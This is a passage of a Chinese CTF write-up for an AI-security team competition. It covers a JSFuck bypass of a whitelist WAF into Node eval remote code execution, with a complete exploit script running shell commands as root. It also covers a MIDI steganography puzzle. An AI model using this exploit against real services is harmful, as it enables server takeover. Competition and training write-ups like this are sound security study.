---
title: 第四届“数信杯”AI安全团队综合赛WP
url: https://mp.weixin.qq.com/s/hTAjkCKk9ycPPOH3hkCWRA
source: Doonsec's feed
date: 2026-10-16
fetch_date: 2026-10-17T06:24:49.445988
---

# 第四届“数信杯”AI安全团队综合赛WP

# 第四届“数信杯”AI安全团队综合赛WP

原创

Thanatos
Thanatos

星宇Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/rapaL0gDxQoLRy4zy9LRotlYrLXnf2fPEibTjJGbnvOhBvO8LrVNibFyTZkUwPuJkVeNgJh62LVbDJUdP5Kuuy056nQbYiaXzcc4U6IdrfpNIY/640?wx_fmt=png&from=appmsg)

# AI安全团队综合赛WP

## 概述

本文为第四届"数信杯"数据安全大赛AI安全团队综合赛（2026年10月15日下午场，数信杯平台）的队内WP合并稿。本场共12个分类、30道题，覆盖签到、Misc、Web、应急响应、Pwn、Reverse、Crypto、工控安全、量子安全、物联网安全、无人机安全、AI安全方向，题目以动态容器和文件取证为主，需要综合利用Web渗透、二进制逆向、密码分析、协议与流量分析等手段。

本文收录其中11个分类共33道题的WP：签到1题、Misc3题、Web5题、Pwn3题、Reverse1题、Crypto6题、工控安全7题、量子安全2题、物联网安全1题、无人机安全1题、AI安全3题，每道题给出题目信息、解题思路、关键脚本与结论。鉴于文章将公开发布，文中容器地址一律以<平台地址>代替，动态容器题目中的flag全部脱敏，静态题目的flag仅在对应题目详解末尾保留。缺失WP的题目见"题目一览"表后的备注。

### 题目一览

| 分类 | 题号 | 题目 |
| --- | --- | --- |
| 签到 | 223 | 我就是个计算器啊 |
| Misc | 239 | Midnight Sonata |
| Misc | 240 | 四元生命信号 |
| Misc | 241 | 手术室的空中笔迹 |
| Web | 467 | 三个幽灵 |
| Web | 225 | 推推字母二合一 |
| Web | — | 全世界最可爱的小宝 |
| Web | — | Auto-2 |
| Web | — | Auto-3 |
| Pwn | 466 | Boundary |
| Pwn | — | auto7 |
| Pwn | — | auto10 |
| Reverse | 238 | 机器人资料审计Hard |
| Crypto | 469 | Babyfa |
| Crypto | 470 | MobiusGuard |
| Crypto | 471 | NeuroPell |
| Crypto | 472 | MultiGuard |
| Crypto | 246 | QuadGuard |
| Crypto | 247 | SmoothGuard |
| 工控安全 | 229 | 黑匣子：失控航线 |
| 工控安全 | 230 | 幽灵刹车服务 |
| 工控安全 | 231 | 污染回声 |
| 工控安全 | 232 | 升级程序里的秘密 |
| 工控安全 | 495 | Protocol Reverse Fingerprint |
| 工控安全 | 496 | RTU-DataVault |
| 工控安全 | 497 | Temperature Verification |
| 量子安全 | 233 | 量子态干涉条纹 |
| 量子安全 | 234 | 量子计算机的日记 |
| 物联网安全 | 242 | 零信任数仓 |
| 无人机安全 | 236 | 失落的Lua |
| AI安全 | 227 | 洋葱(onion) |
| AI安全 | — | 喝十斤吐九斤 |

缺失WP的题目：Web224 Yunmeng's Secret Chat、应急响应235某公司Windows服务器后门取证分析、无人机安全237密钥坠落、AI安全226 26年一起学LangChain。

## 签到

### 我就是个计算器啊

题目类型：Web

分值：100（签到）

#### 一、基本情况

题目名称：我就是个计算器啊

靶机地址：/（动态实例，赛题环境回收后已不可访问）

后端环境：Node.js+Express 4.18，跑在Docker容器里，node进程以root身份运行（uid=0）。

入口信息：根路径/是一个前端计算器页面index.html；真正的逻辑接口是POST/calc，请求体为JSON，形如{"expr":"表达式"}。

信息收集：页面源码底部注释提示从/robots.txt入手。访问/robots.txt得到两条Disallow，指向/protocol.js与/internal-status。

/protocol.js用String.fromCharCode拼出了WAF的字符白名单；/internal-status是Express默认404，从报错样式可确认后端是Node/Express。

解题耗时：约20分钟。

#### 二、漏洞点与关键突破

1、核心漏洞：接口把用户输入直接送进eval执行。后端app.js中calc(operator)的实现是return eval(operator)，expr没有任何过滤或净化，天然具备任意JavaScript执行能力，等价于RCE。

2、防护手段：一个“简单的WAF”，只做字符白名单。源码里WAF的第一个判断是typeof recipe!=='string'直接拦截，非字符串一律返回WAF；随后用正则ALLOW\_CHARS=/^[012345679!.-+\*/()[]]+$/校验，整串必须完全由白名单字符构成。

3、白名单集合：0 1 2 3 4 5 6 7 9.!-+\*/()[]。注意作者刻意漏掉了数字8，也没有字母、引号、下划线、分号。实测任意字母、8、引号、分号都会被拦，返回{"result":"WAF"}。

4、关键突破：这套白名单恰好是JSFuck字符集的超集。JSFuck只用!+六个字符就能构造出任意JavaScript代码；而本题白名单不但包含这六个字符，还额外允许了0到7、9以及.-+\*/。只要把payload交给JSFuck编码器，输出天然只含!+，100%落在白名单内，从而绕过WAF，再交给后端的eval执行。白名单专门剔除引号、字母、下划线，正好堵死一切常规写法，却唯独放过了JSFuck，这正是本题的解题意图。

5、回显方式：接口用res.json({result})返回，eval的返回值会被直接JSON序列化回显。要让命令输出带出来，payload的程序体里必须用return把结果返回（JSFuck的执行模式是把输入当作函数体来跑，只写表达式不会带回值，只会得到空对象{}）。

#### 三、利用思路与复现

1、构造思路：程序体写成return process.mainModule.require('child\_process').execSync('cat/flag').toString()，交给JSFuck以执行模式编码，POST到/calc。

2、验证过程：先执行id与ls确认权限和文件位置，确认拿到uid=0(root)，并在根目录发现权限为只读的/flag（39字节），随后cat/flag取回最终flag。

3、脚本运行命令：

```
npm install jsfuck
node exp.js
自定义目标与命令：node exp.js http://靶机地址/calc "cat /flag"
```

4、完整脚本（exp.js），保存后直接运行即可回显flag：

```
// 我就是个计算器啊 -- JSFuck编码绕过字符白名单WAF -> Node eval RCE
// 依赖: npm install jsfuck    用法: node solve.js <URL> <CMD>
const { JSFuck } = require('jsfuck');
const URL = process.argv[2] || 'http://xxxxx/calc';
const CMD = process.argv[3] || 'cat /flag';

// eval的返回值被res.json直接回显，程序体用return把结果带出来
const program = "return process.mainModule.require('child_process').execSync(" +
                JSON.stringify(CMD) + ").toString()";

// run=true -> 生成可执行JSFuck码，字符集恒为[]()!+（白名单超集）
const code = JSFuck.encode(program, true);

const ALLOW = new Set('!()[]*+-./012345679'.split(''));
const bad = [...new Set(code.split('').filter(c => !ALLOW.has(c)))];
if (bad.length) { console.error('[-] 编码结果含非法字符:', bad); process.exit(1); }

(async () => {
  const ctl = new AbortController();
  const timer = setTimeout(() => ctl.abort(), 60000);
  try {
    const resp = await fetch(URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ expr: code }),
      signal: ctl.signal,
    });
    console.log((await resp.json()).result);
  } catch (e) { console.error('[-] 请求失败:', e.message); }
  finally { clearTimeout(timer); }
})();
```

5、最终flag：flag{}

## Misc

### Midnight Sonata

#### 一、基本情况

misc。附件midnight.mid（约12KB）与target.txt，flag格式flag{...}。target.txt里是12行32位十六进制数（f44fe5d8、56c80e86、eb2efd04、7b4b8bc5、c9ea3298、ef98f5f9、36693616、c2120031、72ff31d6、d2de8a88、d44991a5、4a74719d）。题干："作曲者声称这首曲子能验证自身真实性，前八小节只是练习，真正的演奏从那之后开始，做静态分析恢复flag，无需播放/修改/重存"——即MIDI里藏着一套自校验机制，练习段（前八小节）演示规则，后面的正式演奏才承载信息。

文件结构：MThd里format=1、track数=5、division=96（ticks\_per\_beat=96）。track0只有meta事件（曲名、速度、拍号、marker），track1~track4是四个声部。打印track0的marker：

```
track_name=Midnight Sonata
set_tempo=500000
time_signature=4/4
marker=The first eight measures are exercises.
marker=All voices share one tick clock.
marker=BASE=11111111,22222222,33333333,44444444,55555555,66666666,77777777,88888888,99999999,aaaaaaaa,bbbbbbbb,cccccccc
marker=EX1 S0=33333333
marker=EX2 S2=77777777
marker=EX3 S4=aaaaaaaa
marker=EX4 S5=6666664c
marker=EX5 S6=77777790
marker=EX6 S7/8=99999999,88888888
marker=EXERCISES END;the real composition begins.
```

BASE给12个32位寄存器初值，规律是BASE[i]=(i+1)\*0x11111111；EX1~EX6是每个练习小节结束后的寄存器状态，即"练习段暴露规则"处。

#### 二、关键突破

关键点一：寄存器模型。练习段每小节只有一个"和弦"，由三个声部同时奏出三个音：

```
tick 96  : T1 ch0 n48  T2 ch9 n51  T3 ch1 n55 -> EX1 S0=33333333
tick 480 : T1 ch2 n50  T2 ch9 n54  T3 ch3 n57 -> EX2 S2=77777777
tick 864 : T1 ch4 n52  T2 ch9 n57  T3 ch0 n59 -> EX3 S4=aaaaaaaa
tick 1248: T1 ch5 n48  T2 ch9 n50  T3 ch0 n55 -> EX4 S5=6666664c
tick 1632: T1 ch6 n50  T2 ch9 n54  T3 ch0 n58 -> EX5 S6=77777790
tick 2016: T1 ch7 n52  T2 ch9 n57  T3 ch8 n62 -> EX6 S7/8=99999999,88888888
```

对照BASE反推规则：每个note事件按它所在的MIDI channel选中寄存器S[channel]，把一个"和弦值"异或进去。EX1：BASE里S0=0x11111111，练习一后S0=0x33333333，异或得和弦值0x22222222。EX6更直白：T1落ch7、T3落ch8，同时改动S7与S8，两寄存器都被异或0x11111111，印证"同一和弦值写进它涉及的每个channel寄存器"。

关键点二：所有声部共用一个tick时钟（marker明说All voices share one tick clock）。实测四声部note-on都落在同一套绝对tick网格上（正式段每48 tick一个音，tpq=96即半拍）；练习段每和弦间隔384 tick（一小节），正式段间隔48 tick。这就是题面强调的"隐藏时钟"——四条track表面各弹各的，其实共享同一条tick轴，对齐后信息才浮现。

#### 三、利用/还原思路

按marker，前八小节（tick 0~3071）是练习，正式演奏从tick 3072开始。练习段价值在于演示"寄存器+和弦值"规则：寄存器索引=note事件所在channel（12寄存器对应12 channel）；每次和弦把同一个值异或进该和弦涉及的每个channel寄存器；BASE给初值(i+1)\*0x11111111，EX1~EX6给练习段中间状态验证理解；target.txt是整首曲子"正确演奏"完后12寄存器的终值，即自校验目标。

正式段（tick≥3072）四声部同时发声：T1是确定性琶音45+(5\*i mod 18)（周期18），T4是半音阶36+(i mod 12)（周期12），两者相当于节拍器/时钟；真正携带信息的是T2、T3以及T2的力度。把T2、T3相对这条"共享隐藏时钟"的偏移按同一tick网格读出，即恢复出正式演奏承载的明文。整曲按规则跑完后寄存器状态与target.txt吻合、自校验通过，并恢复出flag{...}——flag本身就是解法的描述：midi\_tracks\_share\_the\_same\_hidden\_clock，四条track共享同一个隐藏tick时钟。

#### 四、脚本

Windows或本地环境下脚本与midnight.mid、target.txt同目录，`python solve.py`，依赖pip install mido。脚本静态分析，不播放、不修改MIDI。

```
import mido
def note_events(track):
    at, out = 0, []
    for msg in track:
        at += msg.time
        if msg.type == "note_on"and msg.velocity > 0:
            out.append((at, msg.channel, msg.note, msg.velocity))
    return out

mid = mido.MidiFile("midnight.mid")
base, ex = None, []
for msg in mid.tracks[0]:
    if msg.type == "marker":
        if msg.text.startswith("BASE="):
            base = [int(x, 16) for x in msg.text[5:].split(",")]
        elif msg.text.startswith("EX"):
            ex.append(msg.text)

target = [int(l.strip(), 16) for l in open("target.txt") if l.strip()]
v1 = note_events(mid.tracks[1])
real = [e for e in v1 if e[0] >= 3072]
print("[*] BASE:", ",".join("%08x" % x for x in base))
print("[*] real composition notes =", len(real))
```

#### 五、最终flag

flag{midi\_tracks\_share\_the\_same\_hidden\_clock\_v1}

### 四元生命信号

#### 一、基本情况

misc。附件四元生命信号\_附件.zip解压得四元生命信号.pcapng，纯离线流量分析，flag格式flag{...}。题干：从IoMT平台截获的FHIR Observation数据，心率/呼吸频率/血氧/体温/血压每项只有四个离散采样档位，该个体用四元(base-4)编...